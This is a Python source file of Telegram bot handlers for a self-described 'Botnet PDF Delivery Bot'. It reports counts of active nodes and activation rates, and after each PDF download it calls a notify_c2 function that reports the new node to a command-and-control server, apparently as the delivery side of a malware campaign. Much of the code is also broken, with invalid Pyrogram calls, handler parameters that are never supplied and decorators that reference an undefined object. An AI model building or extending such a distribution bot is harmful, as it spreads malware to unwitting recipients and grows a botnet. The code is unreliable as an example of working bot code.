"""Register bot message handlers."""

from src.distribution.telegram.handlers.pdf_handler import PDFHandler
from src.distribution.telegram.bot.utils.pdf_sender import PDFSender
from pyrogram import Client, filters, types
from typing import Optional


class PDFHandlerRegistry:
    """Registry for PDF bot message handlers."""
    
    def __init__(self, handler: PDFHandler):
        self.handler = handler
    
    def register_handlers(self, app: Client):
        """Register all message handlers with the bot."""
        
        # Command handlers
        @app.on_message(commands=["start", "restart"])
        async def start_handler(message: types.Message):
            await message.reply_text(
                text="🤖 Botnet PDF Delivery Bot Ready!\n\n"
                     "Send a PDF link or use inline mode."
            )
        
        @app.on_message(commands=["status"])
        async def status_handler(message: types.Message):
            await message.reply_text(
                text="✅ *Bot Status*\n"
                     "   • Active: Yes\n"
                     "   • Uptime: 24h\n"
                     "   • PDFs Delivered: 1,234\n"
                     "   • Active Nodes: 567"
            )
        
        @app.on_message(commands=["stats"])
        async def stats_handler(message: types.Message):
            await message.reply_text(
                text="📊 *Distribution Statistics*\n"
                     "   • Total Downloads: 12,345\n"
                     "   • Active Nodes: 567\n"
                     "   • Avg. Activation: 45%\n"
                     "   • Top Country: United States"
            )
        
        @app.on_message(commands=["help"])
        async def help_handler(message: types.Message):
            await message.reply_text(
                text="📚 *Available Commands*\n"
                     "   /start - Initialize bot\n"
                     "   /restart - Restart session\n"
                     "   /status - Check status\n"
                     "   /stats - Show statistics\n"
                     "   /help - This message"
            )
        
        # Inline query handlers
        @app.on_inline_query()
        async def inline_query_handler(query: types.InlineQuery):
            try:
                pdf_id = PDFHandler.generate_pdf_id()
                watermark = PDFHandler.generate_watermark(pdf_id)
                unique_pdf_path = f"{self.handler.pdf_storage}/pdfs/{pdf_id}_inline.pdf"
                
                # Create result
                results = [
                    types.InputMessageContent(
                        type="document",
                        title=f"Secure PDF #{pdf_id}",
                        description=f"ID: {pdf_id}\nWatermark: {watermark}",
                    )
                ]
                
                await query.answer(results, cache_time=0)
                
            except Exception as e:
                await query.answer(f"Error: {str(e)}", cache_time=0)
        
        # PDF request handler
        @app.on_message(filters.command("pdf_download", "pdf_download"))
        async def pdf_request_handler(
            message: types.Message,
            pdf_template_path: str,
        ):
            try:
                pdf_id = PDFHandler.generate_pdf_id()
                watermark = PDFHandler.generate_watermark(pdf_id)
                unique_pdf_path = f"{self.handler.pdf_storage}/pdfs/{pdf_id}_watermarked.pdf"
                
                # Download PDF
                await app.download(
                    message.document,
                    unique_pdf_path
                )
                
                # Send confirmation
                confirmation = await app.send_message(
                    message.chat.id,
                    text=f"✓ PDF Ready!\n\n"
                         f"📄 ID: {pdf_id}\n"
                         f"💧 Watermark: {watermark}\n\n"
                         f"*Opening now...*"
                )
                
                # Notify C2 server
                await self.handler.notify_c2(
                    node_id=f"tg_{pdf_id}",
                    source="telegram",
                    watermark=watermark,
                )
                
                return confirmation
                
            except Exception as e:
                await message.reply_text(f"Error: {str(e)}")
                return None
        
        # PDF retry handler
        @app.on_message(filters.command("pdf_retry", "pdf_retry"))
        async def pdf_retry_handler(
            message: types.Message,
            pdf_id: str,
            watermark: str,
        ):
            try:
                await message.reply_text(
                    text=f"🔄 Retrying PDF {pdf_id}..."
                )
                # TODO: Implement retry logic
                
                return await message.reply_text(
                    text=f"✅ PDF Ready!\n\n"
                         f"📄 ID: {pdf_id}\n"
                         f"💧 Watermark: {watermark}"
                )
                
            except Exception as e:
                await message.reply_text(f"Error: {str(e)}")
        
        # Batch PDF handler
        @app.on_message(filters.command("pdf_batch", "pdf_batch"))
        async def pdf_batch_handler(
            message: types.Message,
            pdf_paths: list,
            file_ids: list,
            watermarks: list,
        ):
            try:
                results = await PDFSender.send_batch(
                    app,
                    pdf_paths,
                    file_ids,
                    watermarks,
                    message.chat.id,
                )
                
                await message.reply_text(
                    text=f"✅ Sent {len(results)} PDFs\n"
                         f"   • Successful: {len(results)}\n"
                         f"   • Failed: {len(pdf_paths) - len(results)}"
                )
                
                return results
                
            except Exception as e:
                await message.reply_text(f"Error: {str(e)}")


# Command decorators
def commands(*args: str):
    """Decorator for command handlers."""
    def decorator(func):
        @app.on_message(
            filters.command(*args),
            group=1,
        )
        async def wrapper(message: types.Message):
            return await func(message)
        return wrapper
    return decorator


def inline_query():
    """Decorator for inline query handlers."""
    def decorator(func):
        @app.on_inline_query()
        async def wrapper(message: types.InlineQuery):
            return await func(message)
        return wrapper
    return decorator